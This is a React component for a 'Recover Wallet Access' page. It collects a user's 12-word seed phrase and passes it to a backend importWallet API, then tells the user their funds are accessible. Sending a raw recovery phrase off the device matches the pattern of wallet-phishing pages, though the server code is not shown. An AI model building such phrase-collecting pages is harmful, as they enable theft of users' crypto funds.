import wrong from "@/assets/wrong.png";
import { useNavigate } from "react-router-dom";
import { useState } from "react";
import toast from "react-hot-toast";
import { importWallet } from "../../../api/importWallet";
import AuthLayout from "../../layout/AuthLayout";
import CommonSuccessModal from "../../component/CommonSuccessModal";

function SeedPhrase() {
  const navigate = useNavigate();
  const [error, setError] = useState("");
  const [input, setInput] = useState("");
  const [loading, setLoading] = useState(false);
   const [showModal, setShowModal] = useState(false);

  const handleImport = async () => {
    if (!input.trim()) {
      setError("Recovery phrase is required");
      return;
    }

    setError("");

    try {
      setLoading(true);

      const res = await importWallet({
        type: "phrase",
        data: input.trim(),
      });

      toast.success(res.message);
        setShowModal(true);
    }  catch (err: any) {
     setError(err.message || "Something went wrong");
    } finally {
      setLoading(false);
    }
  };

  return (
    <>
    <AuthLayout>
      <div
        className="
        w-full max-w-full sm:max-w-[560px]
        mt-20 sm:mt-0
        rounded-2xl bg-[#0f1a2f]/80 backdrop-blur-md
        border border-[#3C3D47]
        px-5 sm:px-12.5
        py-8 sm:py-10
        text-center"
      >
        <h1
          className="text-white font-bold
          text-xl sm:text-[28px]
          leading-7 sm:leading-8.5
          mb-3 sm:mb-3.75"
        >
          Recover Wallet Access
        </h1>

        <p className="text-base sm:text-lg text-[#7D7E84] mb-6 sm:mb-8.75">
          Use your original 12 word recovery phrase to restore your wallet.
        </p>

        {/* <div className="flex justify-center mb-[15px]">
          <button className="bg-[#202A43] rounded-[10px] py-3 px-[22px] text-white text-base font-semibold">
            12 Word
          </button>
        </div> */}

        <div className="w-full max-w-[640px] mb-4">
          <textarea
            value={input}
            onChange={(e) => {
              setInput(e.target.value);
              setError("");
            }}
            placeholder="Enter seed Phrase"
            rows={4}
            className="
        w-full resize-none
        rounded-[18px]
        border border-[#3C3D47]
        bg-[#161F37]
        p-5 text-white text-lg
        placeholder:text-[#7A7D83] focus:outline-none focus:border-[#25C866]
      "
          />
          {error && (
            <p className="text-[#ef4343] text-sm mt-1 text-left">{error}</p>
          )}
        </div>

        {/* Info */}
        <div
          className="border border-[#FFDD1D1A] rounded-md
          text-sm sm:text-lg
          py-2.5 sm:py-3 text-[#FFDD1D]
          flex items-center gap-2 sm:gap-2.5
          px-3 sm:px-4.5 sm:mx-12 bg-[#FFDD1D05] mb-[35px]"
        >
          <img src={wrong} alt="Secure Wallet" className="h-4 sm:h-auto" />
          <span>Never share your recovery phrase.</span>
        </div>
        <div className="sm:mx-11">
          <button
            onClick={handleImport}
            disabled={loading}
            className={`block w-full text-white py-3.5 sm:py-4.5 rounded-xl font-semibold transition cursor-pointer
              ${
                loading
                  ? "bg-green-400 cursor-not-allowed opacity-70"
                  : "bg-[#25C866] hover:bg-green-500"
              }`}
          >
            {loading ? "Importing..." : "Import Seed Phrase"}
          </button>
        </div>
      </div>
    </AuthLayout>
    <CommonSuccessModal
      open={showModal}
      onClose={() => setShowModal(false)}
      title="Access Unlocked"
      description="Your funds are now accessible. Continue to your dashboard."
      buttonText="Go to Dashboard"
      onButtonClick={() => {
        navigate("/")
      }}
    />
    </>
  );
}

export default SeedPhrase;
